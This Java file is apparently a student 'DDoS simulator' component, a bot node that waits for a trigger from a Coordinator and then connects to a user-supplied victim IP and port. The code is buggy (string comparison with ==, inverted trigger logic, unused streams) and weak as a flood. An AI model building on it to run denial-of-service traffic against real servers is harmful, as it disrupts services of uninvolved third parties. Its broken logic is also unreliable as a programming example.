/**
 *
 * Attacker - DDOS simulator
 *
 * This is one of three components in creating a DDOS attack
 * This code dictates the action taken by the client when creating a connection between the server (Coordinator), and
 * and actions performed after receiving a trigger phrase to issue an attack on the victim server
 *
 * Clients initially enter server mode, and are placed on standby until communication with Coordinator is achieved
 *
 * Exceptions
 *
 * Notable exceptions where problems might arise are when either the port number to enter server mode is unavailable or incorrectly entered
 * or when either the ip address and or port number of the victim server are incorrectly entered or unavailable
 *
 * Improvements
 *
 * Implementing helper classes and scripts to execute the multiple instances of clients would be a potential improvement
 * to consider in emulating a true large scale DDOS attack
 *
 *
 * @author Tishon S. Gumbs
 * @version 2.0
 * @since 2018-11-06
 */

import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.Scanner;

public class Node {

    //Server variables
    private static ServerSocket server;
    private static int PORT;

    //Victim server variables
    public static String victim_ip;
    public static int  victim_port;


    public static void main(String args[]) throws Exception {

        //Node variables

        Socket socket = null;
        String trigger;
        String response;


        //Prompt user for server ip address
        try (Scanner sc = new Scanner(System.in))
        {
            System.out.println("Enter port number to enter server mode");
            PORT = sc.nextInt();

            System.out.println("Enter ip address of victim server");
            victim_ip = sc.next();

            System.out.println("Enter port number of victim server");
            victim_port = sc.nextInt();

            sc.close();
        }


        //Attempt to create Node in sever mode
        try {
            server = new ServerSocket(PORT);
            System.out.println("PORT connection successful");
        } catch (IOException io) {
            System.out.println("Failed to connect to PORT");
            System.exit(1);
        }
        //Method to handle exchange between server and client
        coordinatorInter(server);
    }

    //Method to handle interaction between Coordinator
    public static void coordinatorInter(ServerSocket socket) {

        // Variable declaration
        String trigger = null;
        String exception = null;
        Socket link = null;

        try {
            link = socket.accept();
            //Receive information from the client
            Scanner input = new Scanner(link.getInputStream());
            //Forward information to the client
            PrintWriter output = new PrintWriter(link.getOutputStream(), true);

            while (input.hasNext()) {
                //Constantly receive strings from Coordinator
                trigger = input.next();
                // trigger to enter client mode and initiate DDOS attack
                if (trigger == "attack") {
                    //Disconnect  communication from client
                    input.close();
                    output.close();
                    break;
                }
                attackServer();
            }

        } catch (IOException e) {
            System.out.println("Link was unsuccessful");
        }
    }


    // Attempt to connect to server for DDOS attack
    public static void attackServer() {
        Socket socket = null;
        String responseTime = null;
        String responseEnd = null;

        try {
            socket = new Socket(victim_ip, victim_port);
            System.out.println("Connection Established");
        } catch (IOException e) {
            System.out.println("Failed to connect to server");

        }
        BufferedReader sin = null;
        try {
            sin = new BufferedReader(new InputStreamReader(socket.getInputStream()));
        } catch (IOException e) {
            e.printStackTrace();
        }
        try {
            PrintStream sout = new PrintStream(socket.getOutputStream());
        } catch (IOException e) {
            e.printStackTrace();
        }

        try {
            responseTime = sin.readLine();

        } catch (IOException e) {
            e.printStackTrace();
        }
        System.out.print("Server Connection at: " + responseTime + "\n");

    }
}